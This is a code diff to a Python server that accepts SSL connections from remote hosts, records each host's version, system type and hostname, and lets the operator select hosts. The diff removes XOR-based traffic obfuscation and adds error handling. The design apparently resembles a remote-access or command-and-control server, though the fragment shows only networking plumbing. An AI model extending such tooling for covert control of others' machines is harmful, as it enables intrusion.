@@ -260,8 +260,8 @@ class Server(object):
                                                               str(port)))
             except sock_error:
                 raise sock_error
-            csock = ssl.wrap_socket(csock,server_side=True, certfile="server.crt",
-                            keyfile="server.key")
+            csock = ssl.wrap_socket(csock, server_side=True, certfile="server.crt",
+                                    keyfile="server.key")
             self.hosts[str(self.serial)] = Host(csock, ip, port, self.serial)
             self.serial += 1
 
@@ -274,6 +274,7 @@ class Server(object):
         """
         ret = [0, ""]
         flag = False
+        self.selected = []
         if ids is None:
             for h_id in self.hosts:
                 self.selected.append(self.hosts[h_id])
@@ -381,20 +382,23 @@ class Host(object):
         self.port = port
         self.id = h_id
 
-        ###Get Version###
-        msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
-        tmp = self.recv(int(msg_len)).split("-")
-        self.version = tmp[0]
-        self.type = tmp[1]
-        #################
-        ###Get System Type###
-        msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
-        self.systemtype = self.recv(int(msg_len))
-        #####################
-        ###Get Hostname###
-        msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
-        self.hostname = self.recv(int(msg_len))
-        ##################
+        try:
+            ###Get Version###
+            msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
+            tmp = self.recv(int(msg_len)).split("-")
+            self.version = tmp[0]
+            self.type = tmp[1]
+            #################
+            ###Get System Type###
+            msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
+            self.systemtype = self.recv(int(msg_len))
+            #####################
+            ###Get Hostname###
+            msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
+            self.hostname = self.recv(int(msg_len))
+            ##################
+        except sock_error:
+            self.trash()
 
     def trash(self):
         """Gracefully delete host."""
@@ -419,31 +423,21 @@ class Host(object):
         """Send message to host"""
         if msg is not None and len(msg) > 0:
             try:
-                self.sock.send(self._enc(msg))
+                self.sock.send(msg)
             except sock_error:
                 raise sock_error
 
     def recv(self, size=1024):
         """Receive from host"""
         if size > 0:
-            try:
-                return self._dec(self.sock.recv(size))
-            except sock_error:
+            #try:
+            #    return self.sock.recv(size)
+            #except sock_error:
+            #    raise sock_error
+            data = self.sock.recv(size)
+            if data == '':
                 raise sock_error
-
-    def _enc(self, data):
-        """Obfuscate message (before sending)"""
-        out = bytearray(data)
-        for i, val in enumerate(out):
-            out[i] = val ^ 0x41
-        return out
-
-    def _dec(self, data):
-        """Deobfuscate message (after receiving)."""
-        out = bytearray(data)
-        for i, val in enumerate(out):
-            out[i] = val ^ 0x41
-        return out
+            return data
 
 
 def main():
